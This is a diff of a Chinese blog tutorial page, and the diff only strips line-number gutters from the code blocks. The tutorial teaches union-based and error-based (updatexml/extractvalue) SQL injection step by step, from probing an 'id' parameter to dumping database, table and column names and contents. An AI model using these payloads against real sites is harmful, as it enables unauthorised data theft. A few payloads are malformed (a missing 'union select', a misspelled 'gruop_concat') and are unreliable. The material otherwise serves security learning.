@@ -165,48 +165,48 @@
 <h3 id="if语句判定两个参数相等的情况"><a href="#if语句判定两个参数相等的情况" class="headerlink" title="if语句判定两个参数相等的情况"></a>if语句判定两个参数相等的情况</h3><p>令$a&#x3D;&amp;$b（取b的地址赋予a，则两个参数无论如何都会相等）</p>
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>（设参数为id）</p>
 <p>一、首先，尝试有无sql注入点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>1是为了使语法正确（-1会报错），（一般数据库里的表是从0开始计算的，所以负数会报错），加 ‘ 因为一般存在sql注入都会有一条类似于下面的查询语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
 
 <p>显而易见的是我们输入的东西是id的参数，加 ‘ 先闭合前面的引号，而这时后面会单独出现一个引号，如下所示</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘1’’;</p>
 <p>导致sql语法出现错误，所以此时会报错，只要报错，证明有类似于上方的语句存在，那么就表明有sql注入点</p>
 <p> 二、判断出现了sql注入点，此时就要测试字段（列）数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; order by 数字 --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; order by 数字 --+-</span><br></pre></td></tr></table></figure>
 
 <p>将1改成-1是为了使前面报错，则让系统判断为假，只要后面为真，那么系统就会只执行后面的order by 语句（假或真为真），加–+（或#）是为了将后面的引号注释掉，使语法正确，此时上方的sql语句就会变成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;-1&#x27; order by 数字 --+-&#x27;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;-1&#x27; order by 数字 --+-&#x27;;</span><br></pre></td></tr></table></figure>
 
 <p>可见，此时order by语句被独立了出来，便可作为命令执行</p>
 <p>  三、测试回显点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3 --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3 --+-</span><br></pre></td></tr></table></figure>
 
 <p>查询语句变为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;-1&#x27; union select 1,2,3--+-&#x27;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;-1&#x27; union select 1,2,3--+-&#x27;;</span><br></pre></td></tr></table></figure>
 
 <p>需特别注意的是，查询所得的字段数，就为union selelct 后面的数量，例如查询所得为3，就为1，2，3。若查询所得为2，则为1，2。</p>
 <p>四、查询库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,database() --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,database() --+-</span><br></pre></td></tr></table></figure>
 
 <p>可见，union select 为查询语句，只是将第三步的 3 改为database(),所以查询所得的库名会显示在原本显示 3 的位置</p>
 <p>   五、查询表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27; --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27; --+-</span><br></pre></td></tr></table></figure>
 
 <p>union select 1,2不再赘述</p>
 <p>information_schema 是 mysql 自带的一个数据库，这个库保存了 mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
 <p>group_concat()函数：可以将列中的数据以行的形式显示</p>
 <p>那么使用这个语句我们就可以得到我们第四步得到的库里所有表的名字</p>
 <p>六、查询列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27; --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27; --+-</span><br></pre></td></tr></table></figure>
 
 <p>爆表名的语句中，</p>
 <p>将group_concat函数中的table_name（表名）改为column_name（列名）</p>
 <p>将information_schema库中的tables表改为column表</p>
 <p>将table_schema改为table_name</p>
 <p>七、查询列的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; gruop_concat(列名) from 表名</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; gruop_concat(列名) from 表名</span><br></pre></td></tr></table></figure>
 
 
 
@@ -220,30 +220,30 @@
 <p>当输入的XPATH不符合xml格式时会报错，此时页面会把报错的原因回显在页面上，方便管理者调试。于是就出现了报错注入</p>
 <p> <strong>extractvalue</strong>函数：extractvalue(XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串)；<br>作用：从目标XML中返回包含所查询值的字符串；<br>用法与updatexml相同</p>
 <h4 id="报错注入命令"><a href="#报错注入命令" class="headerlink" title="报错注入命令"></a>报错注入命令</h4><p>一、尝试有无注入点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>假如页面报错，则证明存在注入点（详情原因请移步至联合注入）</p>
 <p>二、利用updatexml函数（或extractvalue函数）构造报错注入语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select 1),0x7e),3) --+- </span><br><span class="line"></span><br><span class="line">?id=-1&#x27; and extractvalue(1,concat(0x7e,(select 1),0x7e)) --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select 1),0x7e),3) --+- </span><br><span class="line"></span><br><span class="line">?id=-1&#x27; and extractvalue(1,concat(0x7e,(select 1),0x7e)) --+-</span><br></pre></td></tr></table></figure>
 
 
 
 <p>输入内容不符合xpath语法就报错了，我们注入利用的就是这一点，如何让全部的数据都校验失败呢？就是使用concat在需要的数据前面加上一个XPATH校验失败的东东就可以了。<br>0x7e用来校验，(select 1)是我们想要的数据，concat用来连接它们两个,0x7e纯粹是显得比较专业而已，也可以直接写  ’~‘ </p>
 <p>三、爆数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),3) --+-</span><br><span class="line">?id=-1&#x27; and extractvalue(1,concat(0x7e,database(),0x7e))//或?id=-1&#x27; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata),0x7e)) --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),3) --+-</span><br><span class="line">?id=-1&#x27; and extractvalue(1,concat(0x7e,database(),0x7e))//或?id=-1&#x27; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata),0x7e)) --+-</span><br></pre></td></tr></table></figure>
 
 
 
 <p>将select 1换成databse()</p>
 <p>需要注意的是，使用extractvalue函数一般会出现 ’‘Subquery returns more than 1 row’‘的情况，这时需要在schemata后面加上limit 1,1函数，然后再修改前面的数字来一行一行查看</p>
 <p>四、爆表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;),0x7e),3) --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;),0x7e),3) --+-</span><br></pre></td></tr></table></figure>
 
 <p>concat的作用是将两个~与中间的数据相连从而使校验错误，其他的就跟union差不多了</p>
 <p>五、爆列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),3) --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),3) --+-</span><br></pre></td></tr></table></figure>
 
 
 
@@ -252,7 +252,7 @@
 
 
 <p>六、读取内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),3) --+-</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),3) --+-</span><br></pre></td></tr></table></figure>
 
 
 
